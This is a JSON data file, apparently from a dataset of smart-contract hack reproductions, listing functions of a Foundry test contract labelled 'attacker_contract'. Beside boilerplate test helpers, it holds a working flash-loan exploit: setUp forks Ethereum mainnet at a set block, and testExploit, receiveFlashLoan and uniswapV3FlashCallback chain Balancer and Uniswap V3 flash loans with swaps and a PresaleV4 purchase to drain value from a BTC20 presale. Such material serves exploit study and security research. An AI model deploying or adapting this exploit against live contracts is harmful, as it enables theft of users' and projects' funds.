[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "receiveFlashLoan",
    "original_code": "    function receiveFlashLoan(\n        address[] memory tokens,\n        uint256[] memory amounts,\n        uint256[] memory feeAmounts,\n        bytes memory userData\n    ) external {\n        exploitBTC();\n        IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 17_949_215 - 1);\n        vm.label(address(BTC20), \"BTC20\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(SDEX), \"SDEX\");\n        vm.label(address(Balancer), \"Balancer\");\n        vm.label(address(SDEX_BTC20_Pair3), \"SDEX_BTC20_Pair3\");\n        vm.label(address(BTC20_WETH_Pair3), \"BTC20_WETH_Pair3\");\n        vm.label(address(uniRouter), \"uniRouter\");\n        vm.label(address(BTC20_WETH_Pair2), \"BTC20_WETH_Pair2\");\n        approveAll();\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        address[] memory tokens = new address[](1);\n        tokens[0] = address(WETH);\n        uint256[] memory amounts = new uint256[](1);\n        amounts[0] = totalBorrowed;\n        bytes memory userData = \"\";\n        console.log(\"Before Start: %d ETH\", WETH.balanceOf(address(this)));\n        Balancer.flashLoan(address(this), tokens, amounts, userData);\n        uint256 intRes = WETH.balanceOf(address(this)) / 1 ether;\n        uint256 decRes = WETH.balanceOf(address(this)) - intRes * 1e18;\n        console.log(\"Attack Exploit: %s.%s ETH\", intRes, decRes);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3FlashCallback",
    "original_code": "    function uniswapV3FlashCallback(uint256 _amount0, uint256 _amount1, bytes calldata data) external {\n        uint256 amount = abi.decode(data, (uint256));\n\n        if (amount == Amount_SDEX_BTC20_Pair3) {\n            BTC20_WETH_Pair3.flash(address(this), 0, Amount_BTC20_WETH_Pair3, abi.encode(Amount_BTC20_WETH_Pair3));\n            (uint256 amountOut, uint256 amountInMax) = (amount + amount / 100 + 1, WETH.balanceOf(address(this)));\n            (addrPath[0], addrPath[1]) = (address(WETH), address(BTC20));\n            uniRouter.swapTokensForExactTokens(amountOut, amountInMax, addrPath, address(this), type(uint256).max);\n            BTC20.transfer(address(SDEX_BTC20_Pair3), amountOut);\n        } else if (amount == Amount_BTC20_WETH_Pair3) {\n            uint256 amountIn = BTC20.balanceOf(address(this));\n            (addrPath[0], addrPath[1]) = (address(BTC20), address(WETH));\n            uniRouter.swapExactTokensForTokens(amountIn, 0, addrPath, address(this), type(uint256).max);\n            uint256 buyAmount = PresaleV4.maxTokensToSell() - PresaleV4.directTotalTokensSold();\n            PresaleV4.buyWithEthDynamic{value: totalBorrowed}(buyAmount);\n            (uint256 amountOut, uint256 amountInMax) = (amount + amount / 100 + 1, WETH.balanceOf(address(this)));\n            (addrPath[0], addrPath[1]) = (address(WETH), address(BTC20));\n            uniRouter.swapTokensForExactTokens(amountOut, amountInMax, addrPath, address(this), type(uint256).max);\n            BTC20.transfer(address(BTC20_WETH_Pair3), amountOut);\n        }\n",
    "description": ""
  }
]